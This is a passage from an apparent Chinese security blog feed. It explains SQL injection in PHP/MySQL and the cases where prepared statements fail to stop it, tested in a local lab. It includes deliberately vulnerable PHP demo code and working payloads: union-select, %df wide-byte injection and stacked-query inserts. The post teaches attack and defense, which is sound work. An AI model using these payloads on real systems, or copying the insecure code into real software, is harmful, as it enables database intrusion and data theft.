(xxx)</code>，有时候是<code>0 or not(xxx)</code>，不过这些都差不多，没多大影响。这个位置个人感觉对练习绕过思路有一定帮助，所以记录下来。珍爱生命，不要扒拉数据，验证存在就好。</p><p>最后，该去干正事了</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/19.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>用来恶心人的</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入&amp;预编译</title>
    <link href="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&amp;%E9%A2%84%E7%BC%96%E8%AF%91/"/>
    <url>/2022/02/05/SQL%E6%B3%A8%E5%85%A5&amp;%E9%A2%84%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL注入-amp-预编译"><a href="#SQL注入-amp-预编译" class="headerlink" title="SQL注入&amp;预编译"></a>SQL注入&amp;预编译</h2><p>这篇文章来源于被预编译搞的头疼，捡垃圾的我只是想捡个注入，然鹅随着使用预编译的广泛使用，让我这个捡垃圾的捡不到注入了。但听说预编译防止不了排序处的注入，于是乎想自己看一下，然后就又能多个捡垃圾的路子了。多捡点垃圾的话晚上就能加个蛋了Q_A_Q</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/1.png"></p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><p>很久很久以前，用户的传参是能够直接拼接到sql的查询语句中去，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">// index.php<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;];<br>mysqli_select_db($conn,sort) or die ( &quot;Unable to connect to the database: test&quot;);<br># 选择数据库<br><br>$sql = &quot;select fraction from fraction where name = &#x27;$username&#x27;;&quot;;# 直接将用户输入拼接进字符串<br>$result = mysqli_query($conn,$sql);<br>echo &#x27;&lt;br/&gt;&#x27;.$sql.&#x27;&lt;br/&gt;&#x27;;# 打印sql语句<br><br>if($fraction = mysqli_fetch_assoc( $result ))&#123;<br>    echo &#x27;查询成功&#x27;;<br>&#125;<br>else&#123;<br>    mysqli_error($conn);<br>&#125;<br><br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;学生:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;分数:&#x27;.$fraction[&#x27;fraction&#x27;];<br><br>$conn-&gt;close();<br>?&gt;<br></code></pre></td></tr></table></figure><p>这里构建了一个简单的查询分数的功能，可以看到直接将用户的输入带入到了sql语句中，这sql注入很明显了</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/2.png" alt="分数表"></p><p>这里可以直接构造payload来实现注入</p><p>payload:<code>1&#39;union select database();#</code></p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/3.png"></p><p>这种情况下，如果做安全防护的话，也只能是从效验用户的输入入手了，但是效验规则大概率都能进行绕过，只不过是绕的难易不一样罢了。但是现在已经进入到了预编译的时代，拼接的情况虽然有，但较少了，再加上防护设备的广泛应用，</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>据听说，预编译一开始是为了提高MySQL的运行效率而诞生，但是由于其先构建语法树，后带入查询参数的特性导致其具有了防止SQL注入的特性。这里简单说一下MySQL的预处理语句的使用，以及防止SQL的注入的原因(因为其他数据库一点不会)</p><h4 id="MySQL预编译"><a href="#MySQL预编译" class="headerlink" title="MySQL预编译"></a>MySQL预编译</h4><p>MySQL预编译执行分为三步：</p><p>1.执行预编译语句，构建语法树，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from &quot;select fraction from fraction where name = ?&quot;;<br># 使用PREPARE stmt_name FROM preparable_stm语法<br># stmt_name是语句名，preparable_stm是具体要执行的语句，变量先由 ？ 进行占位<br></code></pre></td></tr></table></figure><p>2.设置变量，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @a=&#x27;mechoy&#x27;;<br></code></pre></td></tr></table></figure><p>3.执行，将设置的变量代入到已经构建好的语句中进行执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel using @a;<br># 使用EXECUTE stmt_name [USING @var_name [, @var_name] ...]语法<br># 变量位置与占位符一一对应<br></code></pre></td></tr></table></figure><p>执行结束后查看数据库日志：</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/4.png"></p><p>可以看到在使用预处理语句时，数据库共进行了四步操作：1.构建预处理语句；2.设置变量；3.绑定变量；4.执行查询</p><p>预编译的优势在于其不用每一次都构建语法树，以上面为例，当有<code>@b=&#39;admin&#39;</code>时，执行<code>execute sel using @b;</code>时，数据库会直接去fraction表中查询<code>name=admin</code>的fraction值，而不用再一次构建语法树，这可能也就是预编译语句为何能提高MySQL效率的原因</p><p>而预编译语句在防止SQL注入上，看下面这张图：</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/5.png"></p><p>在@b和@c的情况下返回都为空，也就是将@b和@c的值只是当做一个变量，去寻找name字段中与其相同的</p><p>如果在数据库中插入一条<code>name=xx union select database()</code>数据，再次执行就会获得相应的值</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/6.png"></p><p>再执行就会得到如下结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; execute sel using @c;<br>+----------+<br>| fraction |<br>+----------+<br>|      100 |<br>+----------+<br></code></pre></td></tr></table></figure><p>所以这里变量只是一个变量，只是用来比较name字段中是否存在相同的值，存在则返回fraction的值，不存在则返回空，这就是预编译为什么能防止SQL注入的原因。</p><h4 id="PHP-MySQL-预处理语句"><a href="#PHP-MySQL-预处理语句" class="headerlink" title="PHP+MySQL 预处理语句"></a>PHP+MySQL 预处理语句</h4><p>在使用PHP编写预处理语句时，会遇到预编译和模拟预编译(这里先提一下)</p><p>PHP中连接MySQL数据库目前两种较为常见的方法：</p><ul><li>Mysqli</li><li>PDO</li></ul><p>这里先说一下使用Mysqli的预编译语句进行数据的查询</p><h5 id="Mysqli"><a href="#Mysqli" class="headerlink" title="Mysqli"></a>Mysqli</h5><p><code>Mysqli</code>扩展允许我们访问MySQL 4.1及以上版本提供的功能。</p><p>使用PHP的Mysqli实现预编译如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># index1.php<br># $conn为与mysql数据库建立的链接，同时选择<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;];<br><br># $stmt = $conn-&gt;prepare(&quot;select fraction from fraction where name = ?&quot;);   预处理以及绑定<br>$stmt = mysqli_stmt_init($conn);    # 分配并初始化一个语句对象用于mysqli_stmt_prepare()。<br>mysqli_stmt_prepare($stmt,&quot;select fraction from fraction where name = ?&quot;);  # 预处理<br>mysqli_stmt_bind_param($stmt,&quot;s&quot;, $username);   # 绑定<br><br># $stmt-&gt;execute();# 执行<br>mysqli_stmt_execute($stmt);<br>mysqli_stmt_bind_result($stmt,$fraction);   # 将查询结果绑定至$fraction<br><br>if(mysqli_stmt_fetch($stmt))&#123;<br>    echo &#x27;查询成功&#x27;;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;学生:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br># echo &#x27;分数:&#x27;.$fraction;<br>print(&quot;分数: &quot;.$fraction.&quot;\n&quot;);<br>&#125;<br>else&#123;<br>    mysqli_stmt_errno($stmt);<br>&#125;<br><br>$conn-&gt;close();<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行查询<code>name=&quot;mechoy&quot;</code>，查看数据库日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Connectroot@localhost on sort using TCP/IP<br>Prepareselect fraction from fraction where name = ?<br>Executeselect fraction from fraction where name = &#x27;mechoy&#x27;<br># 可以看到这里共分成了三步：1.建立连接；2.构建语法树；3.执行<br></code></pre></td></tr></table></figure><p>这里看起来跟MySQL的预处理语句基本相同，只不过因为这里少了设置变量和将变量绑定进预编译的两步。</p><p>执行查询<code>name=&quot;mechoy&#39; union select database();#&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">4 Connectroot@localhost on sort using TCP/IP<br>4 Prepareselect fraction from fraction where name = ?<br>4 Executeselect fraction from fraction where name = &#x27;mechoy\&#x27; union select database();#&#x27;<br></code></pre></td></tr></table></figure><p>发现这里输入的单引号被转义了，预编译+转义，好像跟SQL注入说再见了，对于我这个只会Sqlmap一把梭的人，好像跟全世界再见了</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/8.png"></p><h5 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h5><ul><li>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</li><li>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</li><li>PDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。</li></ul><p>使用PDO实现预编译如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># index2.php<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;]; // 接收username<br><br># 建立数据库连接<br>header(&quot;Content-Type:text/html;charset=utf-8&quot;);<br>$dbs = &quot;mysql:host=127.0.0.1;dbname=sort&quot;;<br>$dbname = &quot;root&quot;;<br>$passwd = &quot;root&quot;;<br><br>// 创建连接,选择数据库,检测连接<br>try&#123;<br>    $conn = new PDO($dbs, $dbname, $passwd);<br>    echo &quot;连接成功&lt;br/&gt;&quot;;<br>&#125;<br>catch (PDOException $e)&#123;<br>    die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);<br>&#125;<br><br># 设置预编译语句，绑定参数，这里使用命名占位符<br>$stmt = $conn-&gt;prepare(&quot;select fraction from fraction where name = :username&quot;);<br>$stmt-&gt;bindParam(&quot;:username&quot;,$username);<br>$stmt-&gt;execute();<br><br>if($fraction = $stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;<br>    echo &#x27;查询成功&#x27;;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;学生:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br># echo &#x27;分数:&#x27;.$fraction;<br>print_r(&quot;分数&quot;.$fraction[fraction]);<br>&#125;<br>else&#123;<br><br>&#125;<br>$conn=null; # 关闭链接<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行查询<code>name=&quot;mechoy&quot;</code>，查看数据库日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">27 Connectroot@localhost on sort using TCP/IP# 简历连接<br>27 Queryselect fraction from fraction where name = &#x27;mechoy&#x27;# 执行查询<br>27 Quit# 结束<br></code></pre></td></tr></table></figure><p>从日志来看，没有prepare和execute，只是执行了一个查询的SQL语句，并没有进行预编译。显然，PDO默认情况下使用的是模拟预编译。</p><blockquote><p>模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本MySQL)。如果模拟预处理开启，那么客户端程序内部会模拟MySQL数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给MySQL数据库执行。</p></blockquote><p>而想要真正使用预编译，首先需要数据库支持预编译，再在代码中加入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-comment"># bool PDO::setAttribute ( int $attribute , mixed  $value )设置数据库句柄属性。</span><br><span class="hljs-comment"># PDO::ATTR_EMULATE_PREPARES 启用或禁用预处理语句的模拟。 有些驱动不支持或有限度地支持本地预处理。使用此设置强制PDO总是模拟预处理语句（如果为 TRUE  ），或试着使用本地预处理语句（如果为 FALSE ）。如果驱动不能成功预处理当前查询，它将总是回到模拟预处理语句上。需要 bool  类型。 </span><br><span class="hljs-comment">#这里在PHP5.2.17时无效，暂未找到原因</span><br><span class="hljs-comment">#更改版本为PHP5.6.9时生效</span><br></code></pre></td></tr></table></figure><p>再执行查询<code>name=&quot;mechoy&quot;</code>，查看数据库日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">4 Connectroot@localhost on sort using TCP/IP<br>4 Prepareselect fraction from fraction where name = ?<br>4 Executeselect fraction from fraction where name = &#x27;mechoy&#x27;<br>4 Close stmt<br>4 Quit<br># 可以看到当PDO::ATTR_EMULATE_PREPARES设置为false时，取消了模拟预处理，采用本地预处理<br></code></pre></td></tr></table></figure><h3 id="预编译所不能防范的注入"><a href="#预编译所不能防范的注入" class="headerlink" title="预编译所不能防范的注入"></a>预编译所不能防范的注入</h3><h4 id="PDO模拟预处理-宽字节"><a href="#PDO模拟预处理-宽字节" class="headerlink" title="PDO模拟预处理+宽字节"></a>PDO模拟预处理+宽字节</h4><p>模拟代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index3.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// PHP5.2.17+MySQL5.7.26+Apache2.4.39环境下</span><br><span class="hljs-comment">// PHP5.6.9时无法实现</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// 接收username</span><br><br><span class="hljs-comment"># 建立数据库连接</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort1;charset=gbk&quot;</span>;<span class="hljs-comment">// 设置数据库字符编码</span><br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// 创建连接,选择数据库,检测连接</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 设置模拟预编译语句，绑定参数，这里使用命名占位符</span><br><span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-string">&#x27;SET NAMES GBK&#x27;</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select fraction from fraction where name = :username&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:username&quot;</span>,<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>var_dump(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># 关闭链接</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当传入<code>username=&quot;1&#39; union select database();#&quot;</code>时，看数据库日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">28 Connectroot@localhost on sort using TCP/IP<br>28 Queryselect fraction from fraction where name = &#x27;mechoy\&#x27; union select database()#&#x27;<br>28 Quit<br># 将单引号进行转义<br></code></pre></td></tr></table></figure><blockquote><p>模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。</p></blockquote><p>当传入<code>1%df%27%20union%20select%20database();#</code>时，再查看数据库日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">15 Connectroot@localhost on sort1 using TCP/IP<br>15 QuerySET NAMES GBK<br>15 Queryselect fraction from fraction where name = &#x27;1運&#x27; union select database();<br>//可以看到成功利用%df吃掉斜杠，造成宽字节注入<br></code></pre></td></tr></table></figure><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/9.png"></p><h4 id="PDO的错误使用"><a href="#PDO的错误使用" class="headerlink" title="PDO的错误使用"></a>PDO的错误使用</h4><p>一些稍微欠缺经验的开发人员，可能会错误的使用PDO，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// index4.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// 接收username</span><br><br><span class="hljs-comment"># 建立数据库连接</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort1&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// 创建连接,选择数据库,检测连接</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 感觉用了预编译语句，但又好像没完全用</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select fraction from fraction where name = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>var_dump(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># 关闭链接</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这种看似用了prepare进行预处理，但没有关键性的占位符、参数绑定，所以等同于直接拼接</p><h4 id="PDO中的多条执行"><a href="#PDO中的多条执行" class="headerlink" title="PDO中的多条执行"></a>PDO中的多条执行</h4><p>PDO有一个有趣的特性：默认可以支持多条SQL执行。这就造成了堆叠注入的可能，如下例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&lt;?php<br>$id= $_GET[&#x27;id&#x27;]; // 接收username<br><br># 建立数据库连接<br>$dbs = &quot;mysql:host=127.0.0.1;dbname=sort&quot;;<br>$dbname = &quot;root&quot;;<br>$passwd = &quot;root&quot;;<br><br>// 创建连接,选择数据库,检测连接<br>try&#123;<br>$conn = new PDO($dbs, $dbname, $passwd);<br>echo &quot;Sucussful&lt;br/&gt;&quot;;<br>&#125;<br>catch (PDOException $e)&#123;<br>die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);<br>&#125;<br><br># 感觉用了预编译语句，但又好像没完全用<br>$stmt = $conn-&gt;prepare(&quot;select fraction from fraction where id=$id&quot;);<br>$stmt-&gt;execute();<br>$fraction = $stmt-&gt;fetch();<br>print_r($fraction[fraction]);<br><br>$conn=null; # 关闭链接<br>?&gt;<br></code></pre></td></tr></table></figure><p>当输入<code>id=1;select%20database()</code>时，查看数据库日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">5 Connectroot@localhost on sort using TCP/IP<br>5 Queryselect fraction from fraction where id=1;<br>5 Queryselect database()<br># 数据库执行了两条查询语句<br></code></pre></td></tr></table></figure><p>但这样有个问题是，回显位置只有1个，无法回显出第二条查询语句的结果，但可以通过先将内容插入到数据库中，然后再通过查询做出来</p><p>先执行：<code>?id=1;insert into fraction(id,name,fraction) values(111,database(),user()) </code></p><p>查看数据库日志以及数据库是否插入内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">10 Connectroot@localhost on sort using TCP/IP<br>10 Queryselect fraction from fraction where id=1;<br>10 Queryinsert into fraction(id,name,fraction) values(111,database(),user())<br># 可以看到执行了两条语句<br></code></pre></td></tr></table></figure><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/10.png"></p><p>再执行：<code>id=111</code>，能够看到成功查询，但有个问题是当回显位置的值是有个数字型时，就无法直接将我们想要获取的内容存入到数据库的相应字段中了，但好像也有办法，可以尝试一下</p><p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/11.png"></p><h4 id="预编译不生效"><a href="#预编译不生效" class="headerlink" title="预编译不生效"></a>预编译不生效</h4><p>不是所有的地方都能使用预编译语句，有些位置可能会存在使用预编译之后，sql语句不生效，而这些位置又不得不使用拼接。</p><h5 id="like位置"><a href="#like位置" class="headerlink" title="like位置"></a>like位置</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php">index6.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// 接收username</span><br><br><span class="hljs-comment"># 建立数据库连接</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// 创建连接,选择数据库,检测连接</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 